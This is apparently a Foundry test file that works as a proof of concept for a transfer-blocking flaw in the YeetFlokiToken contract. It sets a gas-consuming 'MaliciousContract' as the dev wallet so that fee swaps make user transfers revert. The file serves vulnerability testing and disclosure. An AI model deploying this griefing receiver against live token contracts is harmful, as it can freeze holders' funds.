// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/YeetFlokiToken.sol";

contract MockRouterImplementation {
    address immutable weth;
    address public factory;
    
    constructor(address _weth) {
        weth = _weth;
        factory = address(this);
    }
    
    function WETH() external view returns (address) {
        return weth;
    }

    function createPair(address, address) external view returns (address) {
        return address(0x456);
    }
    
    receive() external payable {}
    
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint,
        uint,
        address[] calldata,
        address to,
        uint
    ) external {
        (bool success,) = to.call{value: 1 ether}("");
        require(success, "Router swap failed");
    }

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity) {
        // Mock implementation
        return (0, 0, 0);
    }
}

contract MaliciousContract {
    uint[100] private dummy; 
    
    receive() external payable {
        for (uint i; i < 100; i++) {
            dummy[i] = block.timestamp;
        }
    }
}

contract AtomicityViolationTest is Test {
    YeetFlokiToken public token;
    MockRouterImplementation public routerMock;
    MaliciousContract public maliciousContract;
    address constant owner = address(0x1);
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address wethMock = address(0x123);

    function setUp() public {
        vm.startPrank(owner);

        routerMock = new MockRouterImplementation(wethMock);
        maliciousContract = new MaliciousContract();

        token = new YeetFlokiToken(address(routerMock));

        token.excludeFromFee(owner);
        token.updatedevWallet(address(maliciousContract));
        token.setTaxes(1, 14, 5, 0);
        token.updateSwapTokensAtAmount(1 ether);
        token.updateSwapEnabled(true);

        token.transfer(address(token), 10 ether);
        token.transfer(alice, 10 ether);

        vm.stopPrank();
    }
    
    function test_devTransferFailureCausesRevert() public {
        console.log("--- Transfer Attempt ---");
        vm.prank(alice);
        (bool transferSuccess, ) = address(token).call(
            abi.encodeWithSignature("transfer(address,uint256)", bob, 1 ether)
        );
        
        if (!transferSuccess) {
            console.log("Transfer reverted (as expected)");
            console.log("Vulnerability Exists: Atomicity violation triggers transaction revert");
        } else {
            console.log("Transfer completed successfully");
            console.log("Vulnerability not Exist: No atomicity violation detected");
            // Explicitly fail the test since we expect revert
            fail("Expected revert but transfer succeeded");
        }
    }
}